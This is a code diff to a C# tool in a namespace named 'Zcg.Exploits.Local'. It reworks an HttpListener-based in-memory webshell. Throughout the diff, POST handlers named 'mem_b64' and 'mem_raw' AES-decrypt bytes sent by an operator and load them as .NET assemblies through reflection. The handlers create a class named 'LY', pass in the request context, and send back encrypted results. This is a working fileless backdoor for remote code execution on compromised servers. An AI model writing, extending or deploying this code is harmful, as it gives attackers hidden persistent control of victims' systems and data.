@@ -549,7 +549,7 @@ namespace Zcg.Exploits.Local
         [DllImport("kernel32.dll", SetLastError = true)]
         static extern bool CloseHandle(IntPtr hObject);
 
-        public void Listener()
+        public void Listener(object ctx)
         {
             HttpListener listener = new HttpListener();
             try
@@ -582,9 +582,21 @@ namespace Zcg.Exploits.Local
                     HttpListenerResponse response = context.Response;
                     SetRespHeader(response);
                     Stream stm = null;
+                    HttpContext httpContext;
 
                     try
                     {
+                         if (ctx != null)
+                    {
+                        httpContext = ctx as HttpContext;
+                    }
+                    else
+                    {
+                        HttpRequest req = new HttpRequest("", request.Url.ToString(), request.QueryString.ToString());
+                        System.IO.StreamWriter writer = new System.IO.StreamWriter(response.OutputStream);
+                        HttpResponse resp = new HttpResponse(writer);
+                        httpContext = new HttpContext(req, resp);
+                    }
                         var method = request.Headers["Type"];
                         log("收到请求: Method=" + method + ", Remote=" + request.RemoteEndPoint.ToString());
 
@@ -633,90 +645,73 @@ namespace Zcg.Exploits.Local
                             }
                         }
                         else if (method == "mem_b64" && request.HttpMethod == "POST")
+                    {
+                        Dictionary<string, string> postParams = parse_post(request);
+                        byte[] data = System.Convert.FromBase64String(postParams[pass]);
+                        data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length);
+                        Cookie sessionCookie = request.Cookies["ASP.NET_SessionId"];
+                        if (sessionCookie == null)
                         {
-                            Dictionary<string, string> postParams = parse_post(request);
-
-                            if (postParams.ContainsKey(pass))
-                            {
-                                byte[] data = System.Convert.FromBase64String(postParams[pass]);
-                                data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length);
-
-                                Cookie sessionCookie = request.Cookies["ASP.NET_SessionId"];
-                                if (sessionCookie == null)
-                                {
-                                    Guid sessionId = Guid.NewGuid();
-                                    var payload = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data });
-                                    sessiontDirectory.Add(sessionId.ToString(), payload);
-                                    response.SetCookie(new Cookie("ASP.NET_SessionId", sessionId.ToString()));
-
-                                    byte[] output = Encoding.UTF8.GetBytes("");
-                                    response.StatusCode = 200;
-                                    response.ContentLength64 = output.Length;
-                                    stm = response.OutputStream;
-                                    stm.Write(output, 0, output.Length);
-                                }
-                                else
-                                {
-                                    if (sessiontDirectory.ContainsKey(sessionCookie.Value))
-                                    {
-                                        dynamic payload = sessiontDirectory[sessionCookie.Value];
-                                        MemoryStream outStream = new MemoryStream();
-                                        object o = ((System.Reflection.Assembly)payload).CreateInstance("LY");
-                                        o.Equals(outStream);
-                                        o.Equals(HttpContext.Current);
-                                        o.Equals(data);
-                                        o.ToString();
-                                        byte[] r = outStream.ToArray();
-                                        outStream.Dispose();
-
-                                        response.StatusCode = 200;
-                                        String new_data = md5.Substring(0, 16) + System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length)) + md5.Substring(16);
-                                        byte[] new_data_bytes = Encoding.ASCII.GetBytes(new_data);
-                                        response.ContentLength64 = new_data_bytes.Length;
-                                        stm = response.OutputStream;
-                                        stm.Write(new_data_bytes, 0, new_data_bytes.Length);
-                                    }
-                                }
-                            }
+                            Guid sessionId = Guid.NewGuid();
+                            var payload = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data });
+                            sessiontDirectory.Add(sessionId.ToString(), payload);
+                            response.SetCookie(new Cookie("ASP.NET_SessionId", sessionId.ToString()));
+                            byte[] output = Encoding.UTF8.GetBytes("");
+                            response.StatusCode = 200;
+                            response.ContentLength64 = output.Length;
+                            stm = response.OutputStream;
+                            stm.Write(output, 0, output.Length);
                         }
+                        else
+                        {
+                            dynamic payload = sessiontDirectory[sessionCookie.Value];
+                            MemoryStream outStream = new MemoryStream();
+                            object o = ((System.Reflection.Assembly)payload).CreateInstance("LY");
+                            o.Equals(outStream);
+                            o.Equals(httpContext);
+                            o.Equals(data);
+                            o.ToString();
+                            byte[] r = outStream.ToArray();
+                            outStream.Dispose();
+                            response.StatusCode = 200;
+                            String new_data = md5.Substring(0, 16) + System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length)) + md5.Substring(16);
+                            byte[] new_data_bytes = Encoding.ASCII.GetBytes(new_data);
+                            response.ContentLength64 = new_data_bytes.Length;
+                            stm = response.OutputStream;
+                            stm.Write(new_data_bytes, 0, new_data_bytes.Length);
+
+                        }
+                    }
                         else if (method == "mem_raw" && request.HttpMethod == "POST" && request.HasEntityBody)
+                    {
+                        int contentLength = int.Parse(request.Headers.Get("Content-Length"));
+                        byte[] array = new byte[contentLength];
+                        request.InputStream.Read(array, 0, contentLength);
+                        byte[] data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(array, 0, array.Length);
+                        if (sessionTable["payload"] == null)
                         {
-                            int contentLength = int.Parse(request.Headers.Get("Content-Length"));
-                            byte[] array = new byte[contentLength];
-                            request.InputStream.Read(array, 0, contentLength);
-                            byte[] data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(array, 0, array.Length);
-
-                            if (sessionTable["payload"] == null)
+                            sessionTable["payload"] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data });
+                        }
+                        else
+                        {
+                            object o = ((System.Reflection.Assembly)sessionTable["payload"]).CreateInstance("LY");
+                            System.IO.MemoryStream outStream = new System.IO.MemoryStream();
+                            o.Equals(outStream);
+                            o.Equals(httpContext);
+                            o.Equals(data);
+                            o.ToString();
+                            byte[] r = outStream.ToArray();
+                            outStream.Dispose();
+                            if (r.Length > 0)
                             {
-                                sessionTable["payload"] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data });
-
-                                byte[] output = Encoding.UTF8.GetBytes("");
+                                r = new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length);
                                 response.StatusCode = 200;
-                                response.ContentLength64 = output.Length;
                                 stm = response.OutputStream;
-                                stm.Write(output, 0, output.Length);
-                            }
-                            else
-                            {
-                                object o = ((System.Reflection.Assembly)sessionTable["payload"]).CreateInstance("LY");
-                                System.IO.MemoryStream outStream = new System.IO.MemoryStream();
-                                o.Equals(outStream);
-                                o.Equals(HttpContext.Current);
-                                o.Equals(data);
-                                o.ToString();
-                                byte[] r = outStream.ToArray();
-                                outStream.Dispose();
-
-                                if (r.Length > 0)
-                                {
-                                    r = new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length);
-                                    response.StatusCode = 200;
-                                    stm = response.OutputStream;
-                                    response.ContentLength64 = r.Length;
-                                    stm.Write(r, 0, r.Length);
-                                }
+                                response.ContentLength64 = r.Length;
+                                stm.Write(r, 0, r.Length);
                             }
                         }
+                    }
                         else
                         {
                             response.StatusCode = 404;
